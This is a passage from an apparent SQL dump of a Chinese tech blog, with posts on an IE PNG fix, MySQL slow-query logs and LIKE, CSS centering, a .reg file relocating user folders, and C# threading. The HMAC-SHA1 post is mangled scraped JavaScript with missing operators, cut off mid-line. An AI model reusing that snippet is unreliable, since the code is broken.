xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;<br />\r\n&lt;title&gt;无标题文档&lt;/title&gt;<br />\r\n&lt;script language=&quot;JavaScript&quot;&gt;<br />\r\nfunction correctPNG() // correctly handle PNG transparency in Win IE 5.5 &amp; 6.<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; var arVersion = navigator.appVersion.split(&quot;MSIE&quot;)<br />\r\n&nbsp;&nbsp;&nbsp; var version = parseFloat(arVersion[1])<br />\r\n&nbsp;&nbsp;&nbsp; if ((version &gt;= 5.5) &amp;&amp; (document.body.filters))<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(var j=0; j&lt;document.images.length; j++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var img = document.images[j]<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var imgName = img.src.toUpperCase()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (imgName.substring(imgName.length-3, imgName.length) == &quot;PNG&quot;)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var imgID = (img.id) ? &quot;id=&#39;&quot; + img.id + &quot;&#39; &quot; : &quot;&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var imgClass = (img.className) ? &quot;class=&#39;&quot; + img.className + &quot;&#39; &quot; : &quot;&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var imgTitle = (img.title) ? &quot;title=&#39;&quot; + img.title + &quot;&#39; &quot; : &quot;title=&#39;&quot; + img.alt + &quot;&#39; &quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var imgStyle = &quot;display:inline-block;&quot; + img.style.cssText<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (img.align == &quot;left&quot;) imgStyle = &quot;float:left;&quot; + imgStyle<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (img.align == &quot;right&quot;) imgStyle = &quot;float:right;&quot; + imgStyle<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (img.parentElement.href) imgStyle = &quot;cursor:hand;&quot; + imgStyle<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var strNewHTML = &quot;&lt;span &quot; + imgID + imgClass + imgTitle<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + &quot; style=\\&quot;&quot; + &quot;width:&quot; + img.width + &quot;px; height:&quot; + img.height + &quot;px;&quot; + imgStyle + &quot;;&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + &quot;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + &quot;(src=\\&#39;&quot; + img.src + &quot;\\&#39;, sizingMethod=&#39;scale&#39;);\\&quot;&gt;&lt;/span&gt;&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; img.outerHTML = strNewHTML<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j = j-1<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n}<br />\r\nwindow.attachEvent(&quot;onload&quot;, correctPNG);<br />\r\n&lt;/script&gt;<br />\r\n&lt;style type=&quot;text/css&quot;&gt;<br />\r\n&lt;!--<br />\r\nbody {<br />\r\nbackground-color: #9999CC;<br />\r\n}<br />\r\n--&gt;<br />\r\n&lt;/style&gt;&lt;/head&gt;</p>\r\n\r\n<p>&lt;body&gt;<br />\r\n把图片换成你自己的图片<br />\r\n&lt;img src=&quot;img/icon_face_03.png&quot; width=&quot;30&quot; height=&quot;30&quot; /&gt;&lt;!--把图片换成你自己的图片 --&gt;<br />\r\n&lt;img src=&quot;img/icon_face_05.png&quot; width=&quot;30&quot; height=&quot;30&quot; /&gt;<br />\r\n&lt;img src=&quot;img/menu_title_over.png&quot; width=&quot;130&quot; height=&quot;36&quot; /&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>方法四</p>\r\n\r\n<p>&lt;script language=&quot;javascript&quot;&gt;<br />\r\n// 修复 IE 下 PNG 图片不能透明显示的问题<br />\r\nfunction fixPNG(myImage) {<br />\r\nvar arVersion = navigator.appVersion.split(&quot;MSIE&quot;);<br />\r\nvar version = parseFloat(arVersion[1]);<br />\r\nif ((version &gt;= 5.5) &amp;&amp; (version &lt; 7) &amp;&amp; (document.body.filters))<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; var imgID = (myImage.id) ? &quot;id=&#39;&quot; + myImage.id + &quot;&#39; &quot; : &quot;&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; var imgClass = (myImage.className) ? &quot;class=&#39;&quot; + myImage.className + &quot;&#39; &quot; : &quot;&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; var imgTitle = (myImage.title) ? &quot;title=&#39;&quot; + myImage.title&nbsp;&nbsp; + &quot;&#39; &quot; : &quot;title=&#39;&quot; + myImage.alt + &quot;&#39; &quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; var imgStyle = &quot;display:inline-block;&quot; + myImage.style.cssText;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; var strNewHTML = &quot;&lt;span &quot; + imgID + imgClass + imgTitle</p>\r\n\r\n<p>&nbsp;&nbsp; + &quot; style=\\&quot;&quot; + &quot;width:&quot; + myImage.width</p>\r\n\r\n<p>&nbsp;&nbsp; + &quot;px; height:&quot; + myImage.height</p>\r\n\r\n<p>&nbsp;&nbsp; + &quot;px;&quot; + imgStyle + &quot;;&quot;</p>\r\n\r\n<p>&nbsp;&nbsp; + &quot;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader&quot;</p>\r\n\r\n<p>&nbsp;&nbsp; + &quot;(src=\\&#39;&quot; + myImage.src + &quot;\\&#39;, sizingMethod=&#39;scale&#39;);\\&quot;&gt;&lt;/span&gt;&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; myImage.outerHTML = strNewHTML;<br />\r\n} }</p>\r\n\r\n<p>window.onload=function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById(&quot;top&quot;).style.height=screen.height/5+&quot;px&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n}//<br />\r\n&lt;/script&gt;<br />\r\n用法如下：<br />\r\n&lt;img src=&quot;logo.png&quot; width=&quot;328&quot; height=&quot;325&quot; border=&quot;0&quot; onload=&quot;fixPNG(this)&quot; /&gt;</p>\r\n',0,1437892698,0,0),(79,32,'关于mysql慢查询','<p>MySQL慢查询分析方法一：</p>\r\n\r\n<p>这个方法我正在用，呵呵，比较喜欢这种即时性的。</p>\r\n\r\n<p>MySQL5.0以上的版本可以支持将执行比较慢的SQL语句记录下来。</p>\r\n\r\n<p>MySQL&gt; show variables like &#39;long%&#39;; &nbsp;</p>\r\n\r\n<p>注：这个long_query_time是用来定义慢于多少秒的才算&ldquo;慢查询&rdquo;</p>\r\n\r\n<p>+-----------------+-----------+</p>\r\n\r\n<p>&nbsp; |Variable_name | Value|</p>\r\n\r\n<p>&nbsp; +-----------------+-----------+</p>\r\n\r\n<p>&nbsp; |long_query_time | 10.000000 |</p>\r\n\r\n<p>&nbsp;&nbsp; +-----------------+-----------+</p>\r\n\r\n<p>&nbsp; 1row in set(0.00 sec)</p>\r\n\r\n<p>&nbsp; MySQL&gt; set long_query_time=1; &nbsp;</p>\r\n\r\n<p>注： 我设置了1, 也就是执行时间超过1秒的都算慢查询。</p>\r\n\r\n<p>Query OK, 0 rows affected (0.00 sec)</p>\r\n\r\n<p>&nbsp; MySQL&gt; show variables like &#39;slow%&#39;;</p>\r\n\r\n<p>&nbsp; +---------------------+---------------+</p>\r\n\r\n<p>&nbsp; |Variable_name | Value|</p>\r\n\r\n<p>&nbsp; +---------------------+---------------+</p>\r\n\r\n<p>&nbsp; |slow_launch_time | 2 |</p>\r\n\r\n<p>&nbsp; | slow_query_log | ON| &nbsp;</p>\r\n\r\n<p>注：是否打开日志记录</p>\r\n\r\n<p>| slow_query_log_file | /tmp/slow.log | &nbsp;</p>\r\n\r\n<p>注： 设置到什么位置</p>\r\n\r\n<p>+---------------------+---------------+</p>\r\n\r\n<p>&nbsp; 3rows in set(0.00 sec)</p>\r\n\r\n<p>&nbsp; MySQL&gt; set globalslow_query_log=&#39;ON&#39; &nbsp;</p>\r\n\r\n<p>注：打开日志记录</p>\r\n\r\n<p>一旦slow_query_log变量被设置为ON，MySQL会立即开始记录。</p>\r\n\r\n<p>/etc/my.cnf 里面可以设置上面MySQL全局变量的初始值。</p>\r\n\r\n<p>long_query_time=1 slow_query_log_file=/tmp/slow.log</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MySQL慢查询分析方法二:</p>\r\n\r\n<p>MySQLdumpslow命令</p>\r\n\r\n<p>/path/MySQLdumpslow -s c-t 10 /tmp/slow-log</p>\r\n\r\n<p>这会输出记录次数最多的10条SQL语句，其中：</p>\r\n\r\n<p>-s,是表示按照何种方式排序，c、t、l、r分别是按照记录次数、时间、查询时间、返回的记录数来排序，ac、at、al、ar，表示相应的倒叙;</p>\r\n\r\n<p>-t, 是top n的意思，即为返回前面多少条的数据;</p>\r\n\r\n<p>-g, 后边可以写一个正则匹配模式，大小写不敏感的;</p>\r\n\r\n<p>比如</p>\r\n\r\n<p>/path/MySQLdumpslow -s r-t 10 /tmp/slow-log</p>\r\n\r\n<p>得到返回记录集最多的10个查询。</p>\r\n\r\n<p>/path/MySQLdumpslow -s t-t 10 -g&ldquo;left join&rdquo;/tmp/slow-log</p>\r\n\r\n<p>得到按照时间排序的前10条里面含有左连接的查询语句。</p>\r\n\r\n<p>以上的相关内容就是对MySQL慢查询分析的介绍，望你能有所收获。</p>\r\n',0,1437892866,0,0),(80,3,'DIV未知高度的垂直居中代码','<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;</p>\r\n\r\n<p>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</p>\r\n\r\n<p>&lt;title&gt;Vertical centering in valid CSS&lt;/title&gt;</p>\r\n\r\n<p>&lt;style type=&quot;text/css&quot;&gt;</p>\r\n\r\n<p>body {padding: 0; margin: 0; font-size: 75%; line-height: 140%; font-family:Arial, Helvetica, sans-serif;}</p>\r\n\r\n<p>body,html{height: 100%; }</p>\r\n\r\n<p>a{color: #333;}</p>\r\n\r\n<p>a:hover{color: green;}</p>\r\n\r\n<p>#outer {height: 100%; overflow: hidden; position: relative;width: 100%; background:ivory; }</p>\r\n\r\n<p>#outer[id] {display: table; position: static;}</p>\r\n\r\n<p>#middle {position: absolute; top: 50%;text-align:center;} /* for explorer only*/</p>\r\n\r\n<p>#middle[id] {display: table-cell; vertical-align: middle; position: static;}</p>\r\n\r\n<p>#inner {position: relative; top: -50%;width: 600px;margin: 0 auto;text-align:left;}/*for explorer only */</p>\r\n\r\n<p>div.greenBorder {border: 1px solid green; background-color: #FFF;}</p>\r\n\r\n<p>p{margin: 1em;}</p>\r\n\r\n<p>&lt;/style&gt;</p>\r\n\r\n<p>&lt;script type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>// &lt;![CDATA[</p>\r\n\r\n<p>function toggleContent(name,n) {</p>\r\n\r\n<p>var i,t=&#39;&#39;,el = document.getElementById(name);</p>\r\n\r\n<p>if (!el.origCont) el.origCont = el.innerHTML;</p>\r\n\r\n<p>for (i=0;i&lt;n;i++) t += el.origCont;</p>\r\n\r\n<p>el.innerHTML = t;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>// ]]&gt;</p>\r\n\r\n<p>&lt;/script&gt;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;div id=&quot;outer&quot;&gt;</p>\r\n\r\n<p>&lt;div id=&quot;middle&quot;&gt;</p>\r\n\r\n<p>&lt;div id=&quot;inner&quot; class=&quot;greenBorder&quot;&gt;</p>\r\n\r\n<p>&lt;p&gt;&lt;a href=&quot;javascript:toggleContent(&#39;inner&#39;,1)&quot;&gt;默认长度&lt;/a&gt;&nbsp; &lt;a href=&quot;javascript:toggleContent(&#39;inner&#39;,2)&quot;&gt;加长页面&lt;/a&gt;&lt;/p&gt;</p>\r\n\r\n<p>&lt;p&gt; 1.打开illustrator,新建一个文件，画个矩形，比你要导入的图片大一些，白色填充。 &lt;br /&gt;</p>\r\n\r\n<p>2.选中矩形，菜单：Effect &gt; Distort &amp; Transform &gt; Zig Zag，设置如下图。 &lt;br /&gt;</p>\r\n\r\n<p>3.菜单：Effect &gt; Stylize &gt; Drop Shadow，设置如下图。 &lt;br /&gt;</p>\r\n\r\n<p>1.打开illustrator,新建一个文件，画个矩形，比你要导入的图片大一些，白色填充。 &lt;br /&gt;</p>\r\n\r\n<p>2.选中矩形，菜单：Effect &gt; Distort &amp; Transform &gt; Zig Zag，设置如下图。 &lt;br /&gt;</p>\r\n\r\n<p>3.菜单：Effect &gt; Stylize &gt; Drop Shadow，设置如下图。&lt;/p&gt;</p>\r\n\r\n<p>&lt;address style=&quot;text-align:center; padding: .5em; clear: left;&quot;&gt;</p>\r\n\r\n<p>Design by &lt;a href=&quot;http://www.forest53.com&quot;&gt;Forestgan&lt;/a&gt; 本演示采用&lt;a href=&quot;http://www.creativecommons.cn/&quot;&gt;创作共用授权&lt;/a&gt;--署名和非商业用途。</p>\r\n\r\n<p>&lt;/address&gt;</p>\r\n\r\n<p>&lt;/div&gt;</p>\r\n\r\n<p>&lt;/div&gt;</p>\r\n\r\n<p>&lt;/div&gt;</p>\r\n\r\n<p>&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n',0,1437892978,0,0),(81,32,'mysql的like模式','<p>expr LIKE pat [ESCAPE &#39;escape-char&#39;]</p>\r\n\r\n<p>模式匹配，使用SQL简单正规表达式比较。返回1 (TRUE) 或 0 (FALSE)。 若 expr 或 pat 中任何一个为 NULL,则结果为 NULL。</p>\r\n\r\n<p>模式不需要为文字字符串。例如，可以被指定为一个字符串表达式或表列。</p>\r\n\r\n<p>在模式中可以同LIKE一起使用以下两种通配符：</p>\r\n\r\n<p>字符</p>\r\n\r\n<p>说明</p>\r\n\r\n<p>%</p>\r\n\r\n<p>匹配任何数目的字符，甚至包括零字符</p>\r\n\r\n<p>_</p>\r\n\r\n<p>只能匹配一种字符</p>\r\n\r\n<p>mysql&gt; SELECT &#39;David!&#39; LIKE &#39;David_&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 1</p>\r\n\r\n<p>mysql&gt; SELECT &#39;David!&#39; LIKE &#39;%D%v%&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 1</p>\r\n\r\n<p>若要对通配符的文字实例进行检验, 可将转义字符放在该字符前面。如果没有指定 ESCAPE字符, 则假设为&lsquo;\\&rsquo;。</p>\r\n\r\n<p>字符串</p>\r\n\r\n<p>说明</p>\r\n\r\n<p>\\%</p>\r\n\r\n<p>匹配一个 &lsquo;%&rsquo;字符</p>\r\n\r\n<p>\\_</p>\r\n\r\n<p>匹配一个 &lsquo;_&rsquo; 字符</p>\r\n\r\n<p>mysql&gt; SELECT &#39;David!&#39; LIKE &#39;David\\_&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 0</p>\r\n\r\n<p>mysql&gt; SELECT &#39;David_&#39; LIKE &#39;David\\_&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 1</p>\r\n\r\n<p>要指定一个不同的转义字符,可使用ESCAPE语句：</p>\r\n\r\n<p>mysql&gt; SELECT &#39;David_&#39; LIKE &#39;David|_&#39; ESCAPE &#39;|&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 1</p>\r\n\r\n<p>转义序列可以为空，也可以是一个字符的长度。 从 MySQL 5.1.2开始, 如若 NO_BACKSLASH_ESCAPES SQL模式被激活, 则该序列不能为空。</p>\r\n\r\n<p>以下两个语句举例说明了字符串比较不区分大小写，除非其中一个操作数为二进制字符串：</p>\r\n\r\n<p>mysql&gt; SELECT &#39;abc&#39; LIKE &#39;ABC&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 1</p>\r\n\r\n<p>mysql&gt; SELECT &#39;abc&#39; LIKE BINARY &#39;ABC&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 0</p>\r\n\r\n<p>在MySQL中, LIKE 允许出现在数字表达式中。 (这是标准SQL LIKE 的延伸）。</p>\r\n\r\n<p>mysql&gt; SELECT 10 LIKE &#39;1%&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&gt; 1</p>\r\n\r\n<p>注释： 由于 MySQL在字符串中使用 C转义语法(例如, 用&lsquo;\\n&rsquo;代表一个换行字符)，在LIKE字符串中，必须将用到的&lsquo;\\&rsquo;双写。例如， 若要查找 &lsquo;\\n&rsquo;, 必须将其写成 &lsquo;\\\\n&rsquo;。而若要查找 &lsquo;\\&rsquo;, 则必须将其写成 it as &lsquo;\\\\\\\\&rsquo;;原因是反斜线符号会被语法分析程序剥离一次，在进行模式匹配时，又会被剥离一次，最后会剩下一个反斜线符号接受匹配。<br />\r\n来自: http://hi.baidu.com/cha369/blog/item/e53701222ea3d3f4d6cae27f.html</p>\r\n',0,1437893097,0,0),(82,28,'怎么将桌面放到D盘','<p>将下边的内容放入一个txt文档中，然后保存名为desktop.reg的文件，然后双击打开，哦了</p>\r\n\r\n<p>内容如下:</p>\r\n\r\n<p>Windows Registry Editor Version 5.00</p>\r\n\r\n<p>[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders]</p>\r\n\r\n<p>&ldquo;Favorites&rdquo;=&rdquo;D:\\\\Favorites&rdquo;</p>\r\n\r\n<p>&ldquo;Desktop&rdquo;=&rdquo;D:\\\\桌面&rdquo;</p>\r\n\r\n<p>&ldquo;Personal&rdquo;=&rdquo;D:\\\\My Documents&rdquo;</p>\r\n\r\n<p>=====分隔符======</p>\r\n\r\n<p>Windows Registry Editor Version 5.00</p>\r\n\r\n<p>这句不知道有用没用的.</p>\r\n\r\n<p>[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders]</p>\r\n\r\n<p>就是要修改的注册表的位置罗.如果想要手工修改注册表就点左下解的开始,运行,然后输入regedit,再找出这位置就行了,不过我已经给你做好了罗.</p>\r\n\r\n<p>&ldquo;Favorites&rdquo;=&rdquo;D:\\\\Favorites&rdquo;</p>\r\n\r\n<p>&ldquo;Desktop&rdquo;=&rdquo;D:\\\\桌面&rdquo;</p>\r\n\r\n<p>&ldquo;Personal&rdquo;=&rdquo;D:\\\\My Documents&rdquo;</p>\r\n\r\n<p>这里就是重点了.看到后面的D:\\\\Favorites这些不?就是移动到哪个盘,哪个文件夹去的.</p>\r\n\r\n<p>手工修改或者制作,把上面的代码COPY然后修改放到一个txt文件,然后修改扩展名为.reg就行了啦.</p>\r\n',0,1437893167,0,0),(83,10,'HMAC-SHA1算法 php怎么写','<p>HMAC-SHA1算法 php怎么写09-1-25&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;b bt2&quot;&gt;&lt;div class=&quot;bt bg1 ft&quot;&gt;&lt;img alt=&quot;回答&quot; height=&quot;16&quot; src=&quot;/static/img/ico2.gif&quot; width=&quot;16&quot;/&gt;回答&lt;/div&gt;&lt;/div&gt;&lt;p class=&quot;ft bb&quot;&gt;我有一个sha1的加密函数，是javascript的在google code上无意搜到，与PHP的sha1做过对比试验，是100％正确的。var hexcase=0;var b64pad=&quot;=&quot;;var chrsz=8;function sha1(s){return binb2hex(core_sha1(str2binb(s),s.length*chrsz));}function b64_sha1(s){return binb2b64(core_sha1(str2binb(s),s.length*chrsz));}function str_sha1(s){return binb2str(core_sha1(str2binb(s),s.length*chrsz));}function hex_hmac_sha1(key,data){return binb2hex(core_hmac_sha1(key,data));}function b64_hmac_sha1(key,data){return binb2b64(core_hmac_sha1(key,data));}function str_hmac_sha1(key,data){return binb2str(core_hmac_sha1(key,data));}function sha1_test(){if(sha1(&quot;abc&quot;)==&quot;a9993e364706816aba3e25717850c26c9cd0d89d&quot;)document.getElementById(&quot;cipher&quot;).style.display=&quot;inline&quot;;}function sha1sumbit(){platnost=newDate;platnost.setTime(platnost.getTime() (86400000*365));if(document.login.xcipher.checked){document.cookie=&quot;js_cipher=1;expires=&quot; platnost.toGMTString();if(document.login.password.value</p>\r\n',0,1437893259,0,0),(84,38,'C#多线程学习(一) 多线程的相关概念','<p>什么是进程？<br />\r\n当一个程序开始运行时，它就是一个进程，进程包括运行中的程序和程序所使用到的内存和系统资源。<br />\r\n而一个进程又是由多个线程所组成的。</p>\r\n\r\n<p>什么是线程？<br />\r\n线程是程序中的一个执行流，每个线程都有自己的专有寄存器(栈指针、程序计数器等)，但代码区是共享的，即不同的线程可以执行同样的函数。</p>\r\n\r\n<p>什么是多线程？<br />\r\n多线程是指程序中包含多个执行流，即在一个程序中可以同时运行多个不同的线程来执行不同的任务，也就是说允许单个程序创建多个并行执行的线程来完成各自的任务。</p>\r\n\r\n<p>多线程的好处：<br />\r\n可以提高CPU的利用率。在多线程程序中，一个线程必须等待的时候，CPU可以运行其它的线程而不是等待，这样就大大提高了程序的效率。</p>\r\n\r\n<p>多线程的不利方面：<br />\r\n线程也是程序，所以线程需要占用内存，线程越多占用内存也越多；<br />\r\n多线程需要协调和管理，所以需要CPU时间跟踪线程；<br />\r\n线程之间对共享资源的访问会相互影响，必须解决竞用共享资源的问题；<br />\r\n线程太多会导致控制太复杂，最终可能造成很多Bug；<br />\r\n接下来将对C#编程中的多线程机制进行探讨。为了省去创建GUI那些繁琐的步骤，更清晰地逼近线程的本质，接下来的所有程序都是控制台程序，程序最后的Console.ReadLine()是为了使程序中途停下来，以便看清楚执行过程中的输出。</p>\r\n\r\n<p>任何程序在执行时，至少有一个主线程。</p>\r\n\r\n<p>一个直观印象的线程示例：<br />\r\n//SystemThread.cs<br />\r\nusing System;<br />\r\nusing System.Threading;</p>\r\n\r\n<p>namespace ThreadTest<br />\r\n{<br />\r\nclass RunIt<br />\r\n{<br />\r\n[STAThread]<br />\r\nstatic void Main(string[] args)<br />\r\n{<br />\r\nThread.CurrentThread.Name=&quot;System Thread&quot;;//给当前线程起名为&quot;System Thread&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(Thread.CurrentThread.Name+&quot;&#39;Status:&quot;+Thread.CurrentThread.ThreadState);<br />\r\nConsole.ReadLine();<br />\r\n}<br />\r\n}<br />\r\n}</p>\r\n\r\n<p>输出如下：<br />\r\nSystem Thread&#39;s Status:Running</p>\r\n\r\n<p>在这里，我们通过Thread类的静态属性CurrentThread获取了当前执行的线程，对其Name属性赋值&ldquo;System Thread&rdquo;，最后还输出了它的当前状态（ThreadState）。</p>\r\n\r\n<p>所谓静态属性，就是这个类所有对象所公有的属性，不管你创建了多少个这个类的实例，但是类的静态属性在内存中只有一个。很容易理解CurrentThread为什么是静态的&mdash;&mdash;虽然有多个线程同时存在，但是在某一个时刻，CPU只能执行其中一个。</p>\r\n\r\n<p>在程序的头部，我们使用了如下命名空间：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; using System;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; using System.Threading;<br />\r\n&nbsp;<br />\r\n在.net framework class library中，所有与多线程机制应用相关的类都是放在System.Threading命名空间中的。如果你想在你的应用程序中使用多线程，就必须包含这个类。</p>\r\n\r\n<p>我们通过其中提供的Thread类来创建和控制线程，ThreadPool类用于管理线程池等。<br />\r\n（此外还提供解决了线程执行安排，死锁，线程间通讯等实际问题的机制。）</p>\r\n\r\n<p>Thread类有几个至关重要的方法，描述如下：<br />\r\nStart()：启动线程；<br />\r\nSleep(int)：静态方法，暂停当前线程指定的毫秒数；<br />\r\nAbort()：通常使用该方法来终止一个线程；<br />\r\nSuspend()：该方法并不终止未完成的线程，它仅仅挂起线程，以后还可恢复；<br />\r\nResume()：恢复被Suspend()方法挂起的线程的执行；</p>\r\n',0,1438006606,0,0),(85,38,'C#多线程学习(二) 如何操纵一个线程','<p>下面我们就动手来创建一个线程，使用Thread类创建线程时，只需提供线程入口即可。（线程入口使程序知道该让这个线程干什么事）<br />\r\n在C#中，线程入口是通过ThreadStart代理（delegate）来提供的，你可以把ThreadStart理解为一个函数指针，指向线程要执行的函数，当调用Thread.Start()方法</p>\r\n\r\n<p>后，线程就开始执行ThreadStart所代表或者说指向的函数。</p>\r\n\r\n<p>打开你的VS.net，新建一个控制台应用程序（Console Application），编写完全控制一个线程的代码示例：<br />\r\n//ThreadTest.cs</p>\r\n\r\n<p>using System;<br />\r\nusing System.Threading;</p>\r\n\r\n<p>namespace ThreadTest<br />\r\n{<br />\r\npublic class Alpha<br />\r\n{<br />\r\npublic void Beta()<br />\r\n{<br />\r\nwhile (true)<br />\r\n{<br />\r\nConsole.WriteLine(&quot;Alpha.Beta is running in its own thread.&quot;);<br />\r\n}<br />\r\n}<br />\r\n};</p>\r\n\r\n<p>public class Simple<br />\r\n{<br />\r\npublic static int Main()<br />\r\n{<br />\r\nConsole.WriteLine(&quot;Thread Start/Stop/Join Sample&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Alpha oAlpha = new Alpha();<br />\r\nfile://这里创建一个线程，使之执行Alpha类的Beta()方法<br />\r\nThread oThread = new Thread(new ThreadStart(oAlpha.Beta));<br />\r\noThread.Start();<br />\r\nwhile (!oThread.IsAlive)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(1);<br />\r\noThread.Abort();<br />\r\noThread.Join();<br />\r\nConsole.WriteLine();<br />\r\nConsole.WriteLine(&quot;Alpha.Beta has finished&quot;);<br />\r\ntry<br />\r\n{<br />\r\nConsole.WriteLine(&quot;Try to restart the Alpha.Beta thread&quot;);<br />\r\noThread.Start();<br />\r\n}<br />\r\ncatch (ThreadStateException)<br />\r\n{<br />\r\nConsole.Write(&quot;ThreadStateException trying to restart Alpha.Beta. &quot;);<br />\r\nConsole.WriteLine(&quot;Expected since aborted threads cannot be restarted.&quot;);<br />\r\nConsole.ReadLine();<br />\r\n}<br />\r\nreturn 0;<br />\r\n}<br />\r\n}<br 